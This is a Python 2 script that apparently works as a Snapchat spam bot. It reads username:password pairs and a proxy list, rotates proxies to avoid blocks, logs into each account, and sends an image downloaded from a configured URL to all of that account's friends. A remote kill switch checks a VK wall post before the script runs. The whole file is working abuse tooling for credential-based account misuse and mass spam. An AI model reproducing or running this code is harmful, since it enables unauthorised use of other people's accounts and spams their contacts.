import urllib2, urllib, requests, json, threading, socket, sys
from snapi import Snapchat
from datetime import datetime

inputData = []
inputProxies = []
imagename = ""
threads = 1

def main():
    t = datetime.now()
    # check everything first
    sts = checkStates() 
    if sts == 0:
        print "Fatal error. Contact me on skype 'volkvid'"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0) #sys.exit(0)
    elif sts == 1:
        f = open("output.txt", "w")
        f.close()
        prepair()
        print "threads =", threads
        if threads == 1:
            oneThread(inputData)
        else:
            leni = len(inputData)
            if threads > leni:
                threads = leni
            
            authdata = slice_list(inputData, threads)
            thr = []
            for i in range(threads):
                data = authdata[i]
                thread = threading.Thread(target=oneThread, args=(data, ))
                thread.start()
                #thr.append(thread)
                thread.join()

            #for t in thr:
                #t.join()

            print "Run out of accounts"


def oneThread(inp):
    result = {}
    for proxy in inputProxies:
        #print "chg prx"
        if not is_bad_proxy(proxy):
            for auth in inp: #inputData:
                s = auth["user"]+":"+auth["pass"]
                #print "1a"
                if s not in result:
                    num = process(proxy, auth)
                    #print "2a", num
                    fff = open("output.txt", "a")
                    if num == "prox":
                        break # bad proxy
                    elif num == 0:
                        result[s] = "#error"
                        print s + " #error"
                        fff.write(s + " #error\n")
                    else:
                        result[s] = "#" + str(num)
                        print s + " #" + str(num)
                        fff.write(s + " #" + str(num) + "\n")
                    fff.close()

        if len(inp) == len(result):
            #print "Ran out of accounts" # ! fix 
            break

    if len(inp) != len(result):
        print "Ran out of proxies"


# start new thread with a pack of users, for ex: 100 users -> 5 threads with 20 users
def process(prox, auth):
    prox = {"https": "https://"+prox}

    try:
        s = Snapchat()
        s.proxies = prox
        # measure "ping"
        tt = datetime.now()
        login = s.login(auth["user"], auth["pass"])
        dt = (datetime.now()-tt).total_seconds()
        try:
            print "l.e", login['error']
        except:
            print "no e"

        try:
            if login['status'] == 403 or login['status'] == 400 or dt > 3.0:
                return "prox"
        except:
            #print "login ok", auth["user"], auth["pass"]
            pass
        
        # upload pic for curr account
        media_id = s.upload(imagename)
        #print "media_id", media_id

        recipients = ""
        for friend in login["friends"]:
            recipients += friend["name"] + ","
        #print "\nrecipients:", recipients
        try:
            done = s.send(media_id, recipients, time = 10)
            #print "(done)", done
            if done:
                #num += 1
                return len(login["friends"])
            else:
                return 0
                
        except Exception as ex:
            #print "(send) to names" , str(ex)
            return 0
    except Exception as ex:
        #print "(main ex)", str(ex)
        return 0


def prepair():
    # IO here, updating all globals
    global imagename, threads, inputData, inputProxies
    try:
        proxiesFile = open("proxies.txt", "r")
        data = proxiesFile.read()
        proxiesFile.close()
        
        if data.find("\r\n") != -1:
            inputProxies = data.split("\r\n")
        else:
            inputProxies = data.split("\n")        
    except BaseException as ex:
        print "No file named 'proxies.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    try:
        inputFile = open("input.txt", "r")
        data = inputFile.read()
        inputFile.close()
        # because win/mac
        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
            
        for item in data:
            item = item.split(":")
            inputData.append({
                "user":item[0].replace("\n", "").replace("\r\n", ""), 
                "pass":item[1].replace("\n", "").replace("\r\n", "")
                }) 
    except BaseException as ex:
        print "No file named 'input.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    image = ""
    try:
        settingsFile = open("settings.txt", "r")
        data = settingsFile.read()
        settingsFile.close()

        if data.find("\r\n") != -1:
            data = data.split("\r\n")
        else:
            data = data.split("\n")
    
        for item in data:
            if item.find("image:") != -1:
                image = item.replace(" ", "")
            if item.find("threads:") != -1:
                threads = item.replace(" ", "")
        image = image.split("image:")[1]
        threads = int(threads.split("threads:")[1])
        if threads < 1:
            threads = 1
        #print "thr", threads 
    except BaseException as ex:
        print "No file named 'settings.txt', error " + str(ex)
        print "\nPress any key to exit"
        try:
            zxc = raw_input()
        except EOFError:
            pass
        sys.exit(0)

    form = image.split("/")
    form = form[len(form)-1].split(".")[1]
    imagename = "file." + form
    urllib.urlretrieve(image, filename=imagename)
    #print "image is downloaded"


def is_bad_proxy(pip):
    socket.setdefaulttimeout(6)
    try:        
        proxy_handler = urllib2.ProxyHandler({'https': pip})        
        opener = urllib2.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        #Snapchat/4.1.01 (Nexus 4; Android 18; gzip)')]
        urllib2.install_opener(opener)        
        req=urllib2.Request('https://www.google.com')
        #https://feelinsonice.appspot.com/bq/') #
        sock=urllib2.urlopen(req)
    except urllib2.HTTPError, e:
        #print "e1", str(e)
        return True 
    except Exception, detail:
        #print "e2", str(detail)
        return True
    return False


def checkStates():
    url = "https://api.vk.com/method/wall.get"
    params = {"owner_id": "-79888882", "count": "100", "offset": "0", "v": "5.26"}
    r = requests.post(url, params = params)#, verify=False)
    r = json.loads(r.text)
    # check if exists
    pid = -1
    for item in r['response']['items']:
        if item['text'] == 'snapchat controll': #code1
            pid = item['id']

    if pid == -1:
        return 0
    else:
        url = "https://api.vk.com/method/wall.getComments"
        params = { "owner_id": "-79888882", "post_id": pid,
                   "count": "1", "offset": "0", "v": "5.26"}
        r = requests.post(url, params = params)#, verify=False)
        r = json.loads(r.text)
        # only first code is checked
        try:
            r = r['response']['items'][0]
            if r['text'] == 'isok' and r['from_id'] == -79888882: #code2
                return 1
            else:
                return 0
        except:
            return 0


def slice_list(input, size):
    input_size = len(input)
    slice_size = input_size / size
    remain = input_size % size
    result = []
    iterator = iter(input)
    for i in range(size):
        result.append([])
        for j in range(slice_size):
            result[i].append(iterator.next())
        if remain:
            result[i].append(iterator.next())
            remain -= 1
    return result


main()
